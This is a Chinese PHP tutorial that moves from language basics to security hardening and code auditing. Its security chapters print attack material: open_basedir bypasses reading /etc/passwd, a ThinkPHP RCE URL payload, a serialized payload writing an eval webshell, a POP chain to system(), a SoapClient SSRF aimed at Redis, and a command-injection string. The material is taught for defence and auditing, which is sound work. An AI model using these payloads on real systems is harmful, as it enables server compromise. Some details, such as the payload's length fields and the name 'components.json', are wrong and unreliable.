# PHP 基础

> 本文档系统介绍 PHP 编程语言的核心知识，配合 php 目录中的代码示例，帮助快速掌握 PHP Web 开发，为 PHP 代码审计和漏洞学习奠定基础。

---

## 目录

- [第一章：PHP 概述](#第一章php-概述)
- [第二章：基础语法](#第二章基础语法)
- [第三章：变量与数据类型](#第三章变量与数据类型)
- [第四章：数组](#第四章数组)
- [第五章：字符串操作](#第五章字符串操作)
- [第六章：条件判断与循环](#第六章条件判断与循环)
- [第七章：函数](#第七章函数)
- [第八章：表单处理](#第八章表单处理)
- [第九章：文件操作](#第九章文件操作)
- [第十章：数据库操作](#第十章数据库操作)
- [第十一章：Session 与 Cookie](#第十一章session-与-cookie)
- [第十二章：PHP 安全基础](#第十二章php-安全基础)

---

## 第一章：PHP 概述

PHP（PHP: Hypertext Preprocessor，超文本预处理器）是一种广泛使用的开源服务器端脚本语言，特别适合 Web 开发，可以嵌入到 HTML 中。

**特点**：语法简单、上手快、数据库支持丰富、跨平台、开源免费、部署简单。

**运行环境**：XAMPP / WAMP / LAMP / phpStudy / 宝塔面板

---

## 第二章：基础语法

```php
<?php
// 单行注释
/* 多行注释 */

echo "Hello, World!";     // 输出
print("Hello");            // 输出（只能一个参数）
print_r($array);           // 打印变量（适合数组）
var_dump($var);            // 详细打印（类型+值）
?>
```

**PHP 标记**：`<?php ... ?>` 标准标签，`<?= $var ?>` 短输出标签。

---

## 第三章：变量与数据类型

### 3.1 变量

```php
$name = "张三";       // 字符串
$age = 25;            // 整数
$height = 1.75;       // 浮点数
$is_ok = true;        // 布尔值

// 可变变量
$a = "hello";
$$a = "world";        // 相当于 $hello = "world"

// 常量
define("PI", 3.14);   // define() 定义
const MAX = 100;      // const 定义（PHP 5.3+）
```

### 3.2 数据类型

`int`、`float`、`string`、`bool`、`array`、`object`、`null`、`resource`

### 3.3 运算符

| 类别 | 运算符 |
|------|--------|
| 算术 | `+` `-` `*` `/` `%` `**` `++` `--` |
| 比较 | `==` `===` `!=` `!==` `<` `>` `<=` `>=` |
| 逻辑 | `&&` `||` `!` `and` `or` |
| 字符串 | `.` 拼接，`.=` 拼接赋值 |

> ⚠️ **安全提示**：PHP 弱类型比较（`==`）可能导致安全问题，如 `0 == "admin"` 为 true，建议使用 `===` 严格比较。

---

## 第四章：数组

```php
// 索引数组
$fruits = ["apple", "banana", "cherry"];
echo $fruits[0];

// 关联数组
$person = ["name" => "张三", "age" => 25];
echo $person["name"];

// 常用函数
count($arr);           // 元素个数
array_push($arr, $x);  // 末尾添加
array_pop($arr);       // 末尾弹出
in_array($x, $arr);    // 是否包含
array_keys($arr);      // 所有键
array_values($arr);    // 所有值
sort($arr);            // 排序
array_merge($a, $b);   // 合并

// 遍历
foreach ($fruits as $fruit) { echo $fruit; }
foreach ($person as $key => $value) { echo "$key: $value"; }
```

---

## 第五章：字符串操作

```php
$str = "Hello World";

strlen($str);               // 长度
strpos($str, "World");      // 查找位置
substr($str, 0, 5);         // 截取
str_replace("o", "O", $str); // 替换
explode(" ", $str);         // 分割为数组
implode("-", $arr);         // 数组合并为字符串
trim($str);                 // 去两端空白
strtolower($str);           // 小写
strtoupper($str);           // 大写
strrev($str);               // 反转
sprintf("%s: %d", $n, $a);  // 格式化
htmlspecialchars($str);     // HTML 转义（防 XSS）
strip_tags($str);           // 去除 HTML 标签
```

---

## 第六章：条件判断与循环

```php
// if-else
if ($age >= 18) {
    echo "成年";
} elseif ($age >= 13) {
    echo "青少年";
} else {
    echo "儿童";
}

// 三元运算
$result = $age >= 18 ? "成年" : "未成年";

// 空合并（PHP 7+）
$name = $_GET["name"] ?? "默认值";

// switch
switch ($day) {
    case 1: echo "周一"; break;
    case 2: echo "周二"; break;
    default: echo "其他";
}

// for
for ($i = 0; $i < 10; $i++) { echo $i; }

// while
while ($count < 5) { $count++; }

// foreach
foreach ($arr as $key => $value) { echo "$key: $value"; }

// break / continue
for ($i = 0; $i < 10; $i++) {
    if ($i == 5) break;      // 跳出循环
    if ($i % 2 == 0) continue; // 跳过本次
}
```

---

## 第七章：函数

```php
// 基本函数
function add($a, $b) {
    return $a + $b;
}

// 默认参数
function greet($name, $greeting = "Hello") {
    return "$greeting, $name!";
}

// 类型声明（PHP 7+）
function mul(int $a, int $b): int {
    return $a * $b;
}

// 可变参数
function sumAll(...$nums) {
    return array_sum($nums);
}

// 匿名函数
$square = function($n) { return $n * $n; };

// 箭头函数（PHP 7.4+）
$cube = fn($n) => $n * $n * $n;

// 常用系统函数
// 时间: time(), date(), strtotime()
// 数学: abs(), ceil(), floor(), round(), rand()
// 变量: isset(), empty(), is_null(), intval()
// 包含: include, require, include_once, require_once
```

---

## 第八章：表单处理

```php
// 获取数据
$name = $_GET["name"] ?? "";       // GET 参数
$user = $_POST["username"] ?? "";  // POST 参数
$val = $_REQUEST["key"] ?? "";     // GET+POST+COOKIE（不推荐）

// 判断提交方式
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 处理表单
}

// 文件上传
$file = $_FILES["avatar"];
move_uploaded_file($file["tmp_name"], "uploads/" . $file["name"]);
```

> ⚠️ **安全提示**：所有用户输入必须验证过滤。输出 HTML 用 `htmlspecialchars()` 防 XSS，数据库操作用预处理语句防 SQL 注入。

---

## 第九章：文件操作

```php
// 简单读写
$content = file_get_contents("file.txt");
file_put_contents("file.txt", "hello");
file_put_contents("file.txt", "追加", FILE_APPEND);

// fopen 方式
$fp = fopen("file.txt", "r");
$line = fgets($fp);          // 读一行
$all = fread($fp, 1024);     // 读指定长度
fclose($fp);

// 文件信息
file_exists("file.txt");     // 是否存在
is_file("file.txt");         // 是否为文件
is_dir("dir");               // 是否为目录
filesize("file.txt");        // 文件大小
filemtime("file.txt");       // 修改时间

// 目录操作
mkdir("dir");               // 创建目录
mkdir("a/b/c", 0755, true); // 递归创建
unlink("file.txt");         // 删除文件
rmdir("dir");               // 删除空目录
scandir(".");               // 列出目录
```

---

## 第十章：数据库操作

### MySQLi 方式

```php
// 连接
$conn = mysqli_connect("localhost", "root", "pass", "dbname");
mysqli_set_charset($conn, "utf8mb4");

// 查询
$result = mysqli_query($conn, "SELECT * FROM users");
while ($row = mysqli_fetch_assoc($result)) {
    echo $row["name"];
}

// 预处理（防 SQL 注入，推荐）
$stmt = mysqli_prepare($conn, "INSERT INTO users (name, age) VALUES (?, ?)");
mysqli_stmt_bind_param($stmt, "si", $name, $age);
$name = "张三";
$age = 25;
mysqli_stmt_execute($stmt);

mysqli_close($conn);
```

> ⚠️ **必须使用预处理语句防止 SQL 注入**。

---

## 第十一章：Session 与 Cookie

```php
// Cookie
setcookie("name", "value", time() + 3600, "/");  // 设置
echo $_COOKIE["name"];                            // 读取
setcookie("name", "", time() - 3600);             // 删除

// Session
session_start();                  // 开启（必须在输出前）
$_SESSION["user"] = "admin";      // 设置
echo $_SESSION["user"];           // 读取
unset($_SESSION["user"]);         // 删除某个
session_unset();                  // 清空全部
session_destroy();                // 销毁会话
session_regenerate_id(true);      // 重新生成 ID（防会话固定）
```

---

## 第十二章：PHP 安全基础

### 常见漏洞与防护

| 漏洞类型 | 防护方法 |
|---------|---------|
| **SQL 注入** | 使用预处理语句（Prepared Statement） |
| **XSS** | 输出用 `htmlspecialchars()`，设置 CSP |
| **CSRF** | Token 验证，Referer 检查 |
| **文件上传漏洞** | 白名单验证，随机文件名，上传目录不可执行 |
| **命令注入** | `escapeshellarg()` 过滤，白名单命令 |
| **文件包含** | 白名单包含，禁用 `allow_url_include` |
| **弱类型漏洞** | 使用 `===` 严格比较 |
| ** SSRF** | 限制内网请求，协议白名单 |

**安全最佳实践**：
- 永远不要信任用户输入
- 关闭 `display_errors`（生产环境）
- 禁用危险函数（`disable_functions`）
- 使用 `password_hash()` 加密密码
- 最小权限原则
- 防止目录遍历（过滤 `../`）

---

## 代码示例

详见 `php/` 目录中的示例文件：
- `01_hello.php` - 第一个 PHP 程序
- `02_variables.php` - 变量与数据类型
- `03_form.php` - 表单处理
- `login.php` - 登录示例

> **延伸学习**：PHP 是 Web 安全的重要研究对象，掌握基础后可进一步学习 PHP 代码审计、常见 CMS 漏洞（WordPress、ThinkPHP 等）、PHP 反序列化漏洞等内容。

---

## 第十三章：PHP 安全配置详解

### 13.1 php.ini 核心安全配置项

php.ini 是 PHP 的核心配置文件，合理配置安全选项是加固 PHP 应用的第一步。

```ini
; ====== 错误处理 ======
; 生产环境关闭错误显示
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php_errors.log
error_reporting = E_ALL & ~E_DEPRECATED & ~E_STRICT
log_errors_max_len = 1024

; ====== 安全限制 ======
; 禁用危险函数
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,dl,eval,assert,pcntl_exec,pcntl_fork,putenv,mail

; 限制远程文件访问（防止 LFI/RFI）
allow_url_fopen = Off
allow_url_include = Off

; ====== 文件上传安全 ======
file_uploads = On
upload_max_filesize = 2M
post_max_size = 8M
max_file_uploads = 20
upload_tmp_dir = /tmp

; ====== 会话安全 ======
session.use_strict_mode = 1
session.use_only_cookies = 1
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = Strict
session.use_strict_mode = 1
session.gc_maxlifetime = 1440
session.sid_length = 48
session.sid_bits_per_character = 6

; ====== 执行限制 ======
max_execution_time = 30
max_input_time = 60
memory_limit = 128M
max_input_nesting_level = 64
max_input_vars = 1000

; ====== 路径安全 ======
open_basedir = /var/www/html/:/tmp/
doc_root = /var/www/html/

; ====== 其他安全项 ======
; 防止 PHP 暴露
expose_php = Off
; 防止自动注册全局变量（已废弃但确认关闭）
register_globals = Off
; 防止魔术引号（已废弃但确认关闭）
magic_quotes_gpc = Off
; 防止 HTTP 响应头注入
; 防止序列化对象注入
serialize_precision = -1
```

### 13.2 危险函数详解

| 函数 | 危险性 | 攻击场景 |
|------|--------|---------|
| `exec()` | 执行系统命令 | 命令注入 |
| `system()` | 直接输出命令结果 | 命令注入 |
| `passthru()` | 原始输出命令结果 | 命令注入 |
| `shell_exec()` | 通过 shell 执行命令 | 命令注入 |
| `eval()` | 执行任意 PHP 代码 | 代码执行 |
| `assert()` | 执行字符串为 PHP 代码 | 代码执行 |
| `file_get_contents()` | 读取任意文件 | 文件读取 |
| `file_put_contents()` | 写入任意文件 | WebShell 写入 |
| `include/require` | 包含任意文件 | LFI/RFI |
| `unserialize()` | 反序列化对象 | 反序列化 RCE |
| `preg_replace()` `/e` 修饰符 | 执行替换为代码 | 代码执行（PHP<7） |
| `create_function()` | 动态创建函数 | 代码执行 |
| `call_user_func()` | 调用回调函数 | 任意函数调用 |

### 13.3 open_basedir 绕过技巧

```php
// open_basedir 限制下尝试读取外部文件
// 常见绕过方式（仅供学习，实际应正确配置）

// 1. ini_restore 绕过（部分版本）
ini_restore('open_basedir');
echo file_get_contents('/etc/passwd');

// 2. chdir + ini_set 绕过
mkdir('/tmp/test'); chdir('/tmp/test');
ini_set('open_basedir','..');
chdir('..'); chdir('..'); chdir('..');
ini_set('open_basedir','/');
echo file_get_contents('/etc/passwd');

// 3. glob 协议绕过（列目录）
$it = new DirectoryIterator("glob:///etc/*");
foreach($it as $f) echo $f . "\n";
```

---

## 第十四章：PHP 框架安全

### 14.1 Laravel 安全特性

```php
// ====== CSRF 防护 ======
// Laravel 自动为每个会话生成 CSRF Token
// 表单中添加：
// @csrf  // Blade 模板指令
// 或手动添加：
<input type="hidden" name="_token" value="{{ csrf_token() }}">

// ====== SQL 注入防护 ======
// Eloquent ORM 自动参数化
$users = User::where('name', $request->name)->get();
// 原始查询也支持绑定
$users = DB::select('SELECT * FROM users WHERE name = ?', [$name]);
// 不安全写法（危险！）
$users = DB::select("SELECT * FROM users WHERE name = '$name'");

// ====== XSS 防护 ======
// Blade 模板默认转义
{{ $userInput }}  // 自动 htmlspecialchars
// 原始输出（仅信任内容使用）
{!! $trustedHtml !!}

// ====== 文件上传验证 ======
$request->validate([
    'file' => 'required|file|mimes:jpg,png,pdf|max:2048',
]);

// ====== 认证与授权 ======
// 中间件认证
Route::middleware('auth')->group(function () {
    Route::get('/dashboard', 'DashboardController@index');
});

// 策略授权
Gate::define('update-post', function ($user, $post) {
    return $user->id === $post->user_id;
});
```

### 14.2 ThinkPHP 安全

ThinkPHP 是国内广泛使用的 PHP 框架，历史上有多个高危漏洞。

```php
// ====== ThinkPHP 5.x 远程代码执行漏洞 ======
// CVE-2018-20062（ThinkPHP 5.0.x / 5.1.x）
// 利用链：路由解析导致任意方法调用
// Payload 示例：
// GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

// 修复：升级到最新版，配置路由严格模式

// ====== ThinkPHP 安全配置 ======
// config/app.php
'default_module' => 'index',
'url_route_must' => true,  // 强制路由模式
'default_filter' => 'htmlspecialchars',  // 默认过滤函数

// ====== ThinkPHP SQL 注入 ======
// 不安全写法
$result = Db::query("SELECT * FROM users WHERE name = '".$name."'");
// 安全写法（参数绑定）
$result = Db::query('SELECT * FROM users WHERE name = ?', [$name]);
// 使用查询构造器
$result = Db::table('users')->where('name', $name)->select();
```

### 14.3 WordPress 安全

WordPress 是全球使用最多的 CMS，插件安全是重点。

```php
// ====== WordPress SQL 注入防护 ======
// 使用 $wpdb 预处理
$wpdb->prepare("SELECT * FROM {$wpdb->prefix}users WHERE id = %d", $id);
$wpdb->prepare("SELECT * FROM {$wpdb->prefix}posts WHERE post_title = %s", $title);

// ====== XSS 防护 ======
// 转义输出
echo esc_html($user_input);        // HTML 内容转义
echo esc_attr($user_input);         // HTML 属性转义
echo esc_url($url);                 // URL 转义
echo wp_kses($html, $allowed);     // 过滤 HTML 标签

// ====== 随机数（Nonce）CSRF 防护 ======
wp_nonce_field('my_action');        // 表单中添加 nonce
check_admin_referer('my_action');   // 验证 nonce

// ====== 文件上传安全 ======
// 检查文件类型
wp_check_filetype($filename);
// 上传目录不可执行 PHP
// .htaccess: php_flag engine off
```

---

## 第十五章：PHP 反序列化漏洞

### 15.1 反序列化漏洞原理

PHP `unserialize()` 函数可以将序列化的字符串还原为对象。如果对象中定义了魔术方法，反序列化时会自动调用这些方法，攻击者可以利用这些方法构造利用链。

```php
// 常见的魔术方法
__construct()   // 对象创建时调用
__destruct()    // 对象销毁时调用
__wakeup()      // 反序列化时调用
__sleep()       // 序列化时调用
__toString()    // 对象被当作字符串时调用
__call()        // 调用不存在的方法时调用
__get()         // 访问不存在的属性时调用
__set()         // 设置不存在的属性时调用
__invoke()      // 对象被当作函数调用时调用
```

### 15.2 简单的反序列化利用链示例

```php
<?php
class FileHandler {
    public $filename;
    public $content;

    function __destruct() {
        // 对象销毁时将 content 写入文件
        file_put_contents($this->filename, $this->content);
    }
}

// 正常使用
$obj = new FileHandler();
$obj->filename = 'log.txt';
$obj->content = 'log entry';
unset($obj);  // 触发 __destruct()，写入 log.txt

// 恶意利用
// 攻击者构造序列化字符串：
$payload = 'O:11:"FileHandler":2:{s:8:"filename";s:18:"/var/www/html/shell.php";s:7:"content";s:29:"<?php eval($_POST[cmd]);?>";}';
// $payload 来自用户输入
$obj = unserialize($payload);
// 当 $obj 销毁时，__destruct() 写入 WebShell
?>
```

### 15.3 复杂的 POP 链利用

POP（Property-Oriented Programming）链是一种利用类中属性和方法相互调用达成利用的方式。

```php
<?php
class StartClass {
    public $data;
    function __destruct() {
        $this->data->process();  // 调用 $data 的 process 方法
    }
}

class MiddleClass {
    public $obj;
    public function process() {
        $this->obj->action();  // 调用 $obj 的 action 方法
    }
}

class EndClass {
    public $cmd;
    public function action() {
        system($this->cmd);  // 最终执行命令
    }
}

// 利用链构造：
// StartClass::__destruct()
//   → MiddleClass::process()
//     → EndClass::action()
//       → system('whoami')

$end = new EndClass();
$end->cmd = 'whoami';

$mid = new MiddleClass();
$mid->obj = $end;

$start = new StartClass();
$start->data = $mid;

// 序列化后传递给 unserialize()
echo serialize($start);
// O:10:"StartClass":1:{s:4:"data";O:10:"MiddleClass":1:{s:3:"obj";O:8:"EndClass":1:{s:3:"cmd";s:6:"whoami";}}}
?>
```

### 15.4 __wakeup 绕过

PHP < 5.6.25 或 PHP 7.0 < 7.0.10 存在 CVE-2016-7124，当序列化字符串中属性个数大于实际属性个数时，`__wakeup()` 不会被调用。

```
// 原始序列化
O:4:"User":1:{s:4:"name";s:5:"admin"}

// 绕过 __wakeup（修改属性个数）
O:4:"User":2:{s:4:"name";s:5:"admin"}
//              ^ 改为 2（大于实际属性数 1）
```

### 15.5 反序列化漏洞防护

```php
// 1. 禁止反序列化不可信数据
// 不安全：
$data = unserialize($_GET['data']);
// 安全替代：
$data = json_decode($_GET['data'], true);

// 2. 使用 allowed_classes 限制（PHP 7+）
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]);
// 或完全禁止对象
$data = unserialize($input, ['allowed_classes' => false]);

// 3. 使用签名验证序列化数据
$signed = hash_hmac('sha256', $serialized, $secret_key);
// 传递 $signed 和 $serialized，接收时验证
if (hash_equals($signed, hash_hmac('sha256', $serialized, $secret_key))) {
    $data = unserialize($serialized);
}
```

---

## 第十六章：PHP 代码审计常见漏洞

### 16.1 SQL 注入审计

```php
// ====== 危险模式1：直接拼接 ======
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($conn, $sql);

// ====== 危险模式2：字符串拼接 ======
$sql = "SELECT * FROM users WHERE name = '" . $_POST['name'] . "'";

// ====== 危险模式3：动态表名/列名 ======
$sql = "SELECT * FROM {$_GET['table']} WHERE id = ?";
// 预处理无法保护表名/列名

// ====== 安全写法 ======
// 预处理语句
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ? AND status = ?');
$stmt->execute([$id, $status]);

// PDO 命名参数
$stmt = $pdo->prepare('SELECT * FROM users WHERE name = :name');
$stmt->execute(['name' => $name]);

// 动态表名白名单
$allowedTables = ['users', 'products', 'orders'];
$table = in_array($_GET['table'], $allowedTables) ? $_GET['table'] : 'users';
$sql = "SELECT * FROM $table WHERE id = ?";
```

### 16.2 XSS 审计

```php
// ====== 反射型 XSS ======
echo $_GET['name'];  // 危险
echo "Hello, " . $_GET['name'];  // 危险

// ====== 存储型 XSS ======
// 存入数据库时不过滤
mysqli_query($conn, "INSERT INTO comments (content) VALUES ('{$_POST['comment']}')");
// 输出时不转义
echo $row['content'];

// ====== DOM 型 XSS ======
// 前端 JavaScript 直接使用用户输入
// <script>document.getElementById('output').innerHTML = location.hash.slice(1);</script>

// ====== 安全防护 ======
// 输出到 HTML 上下文
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// 输出到 JavaScript 上下文
echo json_encode($input, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);

// 输出到 URL
echo urlencode($input);

// Content Security Policy
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'");
```

### 16.3 文件上传漏洞审计

```php
// ====== 危险模式1：无验证 ======
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);

// ====== 危险模式2：仅检查 Content-Type ======
if ($_FILES['file']['type'] == 'image/jpeg') {  // 可伪造
    move_uploaded_file(...);
}

// ====== 危险模式3：黑名单后缀 ======
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($ext, ['php', 'phtml', 'php5'])) {  // 遗漏 .pht, .phar 等
    move_uploaded_file(...);
}

// ====== 危险模式4：不检查文件内容 ======
// 仅检查后缀但可上传 .jpg 内容的 PHP 文件

// ====== 安全上传 ======
function secureUpload($file) {
    // 1. 白名单验证后缀
    $allowedExt = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowedExt)) return false;

    // 2. 验证 MIME 类型
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $mime = $finfo->file($file['tmp_name']);
    $allowedMime = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
    if (!in_array($mime, $allowedMime)) return false;

    // 3. 验证文件内容（图片）
    if (strpos($mime, 'image/') === 0) {
        $imgInfo = getimagesize($file['tmp_name']);
        if ($imgInfo === false) return false;
    }

    // 4. 随机文件名
    $newName = bin2hex(random_bytes(16)) . '.' . $ext;

    // 5. 存储到不可执行目录
    $uploadDir = '/var/www/uploads/';
    move_uploaded_file($file['tmp_name'], $uploadDir . $newName);

    // 6. .htaccess 禁止执行
    file_put_contents($uploadDir . '.htaccess', "php_flag engine off");

    return $newName;
}
```

### 16.4 命令注入审计

```php
// ====== 危险模式1：直接拼接 ======
system("ping " . $_GET['host']);  // ; cat /etc/passwd
exec("convert " . $_GET['file'] . " output.png");

// ====== 危险模式2：escapeshellarg 不完整 ======
$cmd = "ls " . escapeshellarg($_GET['dir']);
// 虽然转义了参数但仍可能被利用

// ====== 安全方式 ======
// 1. 避免调用系统命令，使用 PHP 内置函数
// 用 scandir() 替代 ls
// 用 unlink() 替代 rm

// 2. 必须使用命令时严格过滤
$allowedHosts = ['localhost', '127.0.0.1'];
$host = in_array($_GET['host'], $allowedHosts) ? $_GET['host'] : '127.0.0.1';
system("ping -c 1 " . escapeshellarg($host));
```

---

## 第十七章：PHP SOAP/REST API 安全

### 17.1 SOAP 安全

```php
// ====== SOAP 服务端 ======
$server = new SoapServer('service.wsdl', [
    'soap_version' => SOAP_1_2,
    'encoding' => 'UTF-8',
]);

// ====== SOAP SSRF ======
// SoapClient 支持 URI 发起请求
$soap = new SoapClient(null, ['location' => 'http://127.0.0.1:6379', 'uri' => 'a']);
$soap->__call('str', ['str' => "CONFIG SET dir /var/www/html\r\n"]);

// 利用 SoapClient 发起内网请求（SSRF）
$soap = new SoapClient(null, [
    'location' => "http://127.0.0.1:80",
    'uri' => "test",
    'user_agent' => "Custom/1.0\r\nX-Header: injection"
]);

// ====== SOAP 防护 ======
// 1. 验证 WSDL 来源
// 2. 禁止加载外部 DTD
libxml_disable_entity_loader(true);
// 3. 防止 XXE
libxml_use_internal_errors(true);
```

### 17.2 REST API 安全

```php
// ====== JWT 认证 ======
// 生成 JWT
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

$payload = [
    'user_id' => $userId,
    'role' => 'admin',
    'exp' => time() + 3600,  // 1小时后过期
];
$jwt = JWT::encode($payload, $secretKey, 'HS256');

// 验证 JWT
try {
    $decoded = JWT::decode($jwt, new Key($secretKey, 'HS256'));
    $userId = $decoded->user_id;
} catch (Exception $e) {
    // 无效 token
    http_response_code(401);
    exit(json_encode(['error' => 'Unauthorized']));
}

// ====== API 安全最佳实践 ======
// 1. 速率限制
$rateLimit = 100;  // 每分钟 100 次
$ip = $_SERVER['REMOTE_ADDR'];
$key = "rate:$ip";
$count = $redis->incr($key);
if ($count == 1) $redis->expire($key, 60);
if ($count > $rateLimit) {
    http_response_code(429);
    exit(json_encode(['error' => 'Too Many Requests']));
}

// 2. 输入验证
$data = json_decode(file_get_contents('php://input'), true);
// 使用 filter_var 验证
$email = filter_var($data['email'] ?? '', FILTER_VALIDATE_EMAIL);
if ($email === false) {
    exit(json_encode(['error' => 'Invalid email']));
}

// 3. CORS 配置
header('Access-Control-Allow-Origin: https://trusted.example.com');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Access-Control-Allow-Credentials: true');
```

---

## 第十八章：PHP 密码哈希与加密

### 18.1 密码哈希

```php
// ====== 不安全的方式（不要使用） ======
$hash = md5($password);          // 已被破解
$hash = sha1($password);         // 已被破解
$hash = md5($password . $salt);  // 仍可被彩虹表破解

// ====== 安全的方式：password_hash（PHP 5.5+） ======
// 生成哈希（自动加盐）
$hash = password_hash($password, PASSWORD_DEFAULT);
// 指定算法和开销
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
// Argon2（PHP 7.2+，更安全）
$hash = password_hash($password, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536,
    'time_cost' => 4,
    'threads' => 1
]);

// 验证密码
if (password_verify($inputPassword, $storedHash)) {
    echo '密码正确';
} else {
    echo '密码错误';
}

// 检查是否需要重新哈希（升级算法或增加 cost）
if (password_needs_rehash($storedHash, PASSWORD_DEFAULT)) {
    $newHash = password_hash($inputPassword, PASSWORD_DEFAULT);
    // 更新数据库中的哈希
}

// ====== 自定义 PBKDF2 ======
function pbkdf2($password, $salt, $iterations = 10000, $length = 32) {
    $hash = hash_pbkdf2('sha256', $password, $salt, $iterations, $length, true);
    return bin2hex($hash);
}
```

### 18.2 数据加密

```php
// ====== AES-256-CBC 加密 ======
function encrypt($data, $key) {
    $iv = openssl_random_pseudo_bytes(16);
    $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $encrypted);
}

function decrypt($data, $key) {
    $data = base64_decode($data);
    $iv = substr($data, 0, 16);
    $encrypted = substr($data, 16);
    return openssl_decrypt($encrypted, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
}

// ====== AES-256-GCM（带认证，更安全） ======
function encryptGCM($data, $key) {
    $iv = openssl_random_pseudo_bytes(12);
    $tag = '';
    $ciphertext = openssl_encrypt($data, 'AES-256-GCM', $key, OPENSSL_RAW_DATA, $iv, $tag);
    return base64_encode($iv . $tag . $ciphertext);
}

// ====== 密钥管理 ======
// 不要硬编码密钥，使用环境变量
$key = getenv('ENCRYPTION_KEY');
// 或从密钥管理服务获取
// 密钥应定期轮换
```

---

## 第十九章：PSR 规范与安全

### 19.1 PSR 安全相关规范

PSR（PHP Standard Recommendations）是 PHP 框架互操作组织制定的标准。

| 规范 | 说明 | 安全相关性 |
|------|------|-----------|
| **PSR-1** | 基础编码标准 | 规范化代码减少漏洞 |
| **PSR-4** | 自动加载规范 | 防止类文件包含漏洞 |
| **PSR-7** | HTTP 消息接口 | 规范 HTTP 请求/响应处理 |
| **PSR-12** | 编码标准 | 严格编码规范 |
| **PSR-15** | HTTP 中间件 | 统一中间件安全处理 |
| **PSR-17** | HTTP 工厂 | HTTP 对象创建规范 |

### 19.2 PSR-15 安全中间件

```php
use Psr\Http\Server\MiddlewareInterface;
use Psr\Http\Server\RequestHandlerInterface;
use Psr\Http\Message\ResponseInterface;
use Psr\Http\Message\ServerRequestInterface;

// CSRF 验证中间件
class CsrfMiddleware implements MiddlewareInterface {
    public function process(ServerRequestInterface $request, RequestHandlerInterface $handler): ResponseInterface {
        if ($request->getMethod() === 'POST') {
            $token = $request->getParsedBody()['csrf_token'] ?? '';
            $sessionToken = $_SESSION['csrf_token'] ?? '';
            if (!hash_equals($sessionToken, $token)) {
                return new Response(403, [], 'CSRF token validation failed');
            }
        }
        return $handler->handle($request);
    }
}

// XSS 过滤中间件
class XssMiddleware implements MiddlewareInterface {
    public function process(ServerRequestInterface $request, RequestHandlerInterface $handler): ResponseInterface {
        $response = $handler->handle($request);
        $response = $response->withHeader('X-XSS-Protection', '1; mode=block');
        $response = $response->withHeader('X-Content-Type-Options', 'nosniff');
        $response = $response->withHeader('X-Frame-Options', 'SAMEORIGIN');
        return $response;
    }
}
```

### 19.3 Composer 依赖安全

```bash
# 检查依赖中的已知漏洞
composer audit

# 使用 roave/security-advisories 包
# composer require roave/security-advisories:dev-latest
# 该包会在安装时检查所有依赖是否有已知安全漏洞

# 定期更新依赖
composer update --dry-run  # 先检查有哪些更新
composer update            # 执行更新

# 使用 components.json 锁定版本
# 确保所有依赖版本被锁定
```

### 19.4 PHP 安全编码清单

```
[ ] 使用最新版 PHP（7.4+ 或 8.x）
[ ] 配置 php.ini 安全项（disable_functions, open_basedir 等）
[ ] 所有数据库操作使用预处理语句
[ ] 所有输出使用 htmlspecialchars 转义
[ ] 密码使用 password_hash 加密
[ ] 敏感数据使用 AES-256-GCM 加密
[ ] 文件上传使用白名单 + MIME 验证
[ ] 禁用 unserialize 处理用户输入
[ ] 配置 CSRF Token 验证
[ ] 设置安全 HTTP 响应头
[ ] 使用 Composer 管理依赖并定期审计
[ ] 开启错误日志记录
[ ] 定期进行代码安全审计
```
